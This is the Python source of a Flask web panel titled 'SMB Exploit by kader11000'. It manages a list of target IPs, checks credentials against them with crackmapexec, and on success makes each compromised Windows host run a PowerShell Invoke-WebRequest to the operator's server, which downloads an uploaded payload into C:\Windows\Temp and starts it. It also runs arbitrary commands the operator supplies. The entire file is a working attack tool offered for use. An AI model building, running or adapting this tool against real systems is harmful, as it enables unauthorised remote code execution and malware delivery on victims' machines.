from flask import Flask, render_template_string, request, send_from_directory
import subprocess
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'payloads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def load_targets():
    targets = []
    if os.path.exists('targets.txt'):
        with open('targets.txt', 'r') as f:
            for line in f:
                if ',' in line:
                    name, ip = line.strip().split(',')
                    targets.append({'name': name, 'ip': ip})
    return targets

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SMB Exploit by kader11000</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e2f; color: #eee; padding: 20px; }
        h1 { color: #00ffd5; text-align: center; }
        form { background: #2c2c3a; padding: 20px; border-radius: 10px; }
        input, select, textarea { width: 100%; padding: 8px; margin: 5px 0; border-radius: 5px; border: none; }
        input[type=submit] { background: #00ffd5; color: black; cursor: pointer; font-weight: bold; }
        pre { background: black; padding: 15px; border-radius: 10px; overflow-x: auto; }
        hr { border: 1px solid #444; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>kader11000 | SMB Exploit Panel</h1>

    <form method="post" enctype="multipart/form-data">
        <h3>Select Target:</h3>
        <select name="target" required>
            {% for t in targets %}
            <option value="{{ t.ip }}">{{ t.name }} ({{ t.ip }})</option>
            {% endfor %}
        </select>

        <h3>Credentials:</h3>
        Username: <input type="text" name="username">
        Password: <input type="text" name="password">
        Domain (optional): <input type="text" name="domain">

        <h3>Upload Primary Payload:</h3>
        <input type="file" name="payload">

        <h3>Upload & Execute Additional File (Optional):</h3>
        <input type="file" name="execfile">

        <h3>Commands to run after access (one per line):</h3>
        <textarea name="commands" rows="5"></textarea><br>

        <input type="submit" value="Run Exploit & Upload Files">
    </form>

    <hr>

    <h3>Add New Target</h3>
    <form method="post">
        Host Name: <input type="text" name="new_name" required>
        IP Address: <input type="text" name="new_ip" required>
        <input type="submit" name="add_target" value="Add Target">
    </form>

    {% if output %}
    <hr>
    <h3>Output:</h3>
    <pre>{{ output }}</pre>
    {% endif %}
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    output = ''
    targets = load_targets()

    if request.method == 'POST':
        if 'add_target' in request.form:
            new_name = request.form['new_name']
            new_ip = request.form['new_ip']
            with open('targets.txt', 'a') as f:
                f.write(f"{new_name},{new_ip}\n")
            output = f"[+] Added new target: {new_name} ({new_ip})"
            targets = load_targets()
        else:
            target = request.form['target']
            username = request.form['username']
            password = request.form['password']
            domain = request.form['domain']
            commands = request.form['commands'].strip().split('\n')

            payload = request.files['payload']
            exec_file = request.files['execfile']

            payload_filename = ''
            if payload and payload.filename:
                payload_filename = payload.filename
                payload.save(os.path.join(UPLOAD_FOLDER, payload_filename))

            exec_filename = ''
            if exec_file and exec_file.filename:
                exec_filename = exec_file.filename
                exec_file.save(os.path.join(UPLOAD_FOLDER, exec_filename))

            cme_cmd = ['crackmapexec', 'smb', target]
            if username:
                cme_cmd += ['-u', username]
            if password:
                cme_cmd += ['-p', password]
            if domain:
                cme_cmd += ['-d', domain]

            try:
                result = subprocess.check_output(cme_cmd, stderr=subprocess.STDOUT).decode()
                output += result

                if "Pwn3d!" in result or "SMB Signing: False" in result:
                    output += "\n[+] Access successful, executing payload..."

                    if payload_filename:
                        run_payload = cme_cmd + ['-x',
                            f'powershell -c "Invoke-WebRequest http://<YOUR_IP>:5000/download/{payload_filename} -OutFile C:\\Windows\\Temp\\{payload_filename}; Start-Process C:\\Windows\\Temp\\{payload_filename}"'
                        ]
                        payload_result = subprocess.check_output(run_payload, stderr=subprocess.STDOUT).decode()
                        output += f"\n[+] Payload executed:\n{payload_result}"

                    for cmd in commands:
                        if cmd.strip():
                            exec_cmd = cme_cmd + ['-x', cmd]
                            cmd_result = subprocess.check_output(exec_cmd, stderr=subprocess.STDOUT).decode()
                            output += f"\n[+] Command: {cmd}\n{cmd_result}"

                    if exec_filename:
                        run_exec = cme_cmd + ['-x',
                            f'powershell -c "Invoke-WebRequest http://<YOUR_IP>:5000/download/{exec_filename} -OutFile C:\\Windows\\Temp\\{exec_filename}; Start-Process C:\\Windows\\Temp\\{exec_filename}"'
                        ]
                        exec_result = subprocess.check_output(run_exec, stderr=subprocess.STDOUT).decode()
                        output += f"\n[+] Executed additional file:\n{exec_result}"
                else:
                    output += "\n[-] Access failed, check credentials or try another target."

            except subprocess.CalledProcessError as e:
                output += f"\n[!] Error:\n{e.output.decode()}"

    return render_template_string(HTML_TEMPLATE, output=output, targets=targets)

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
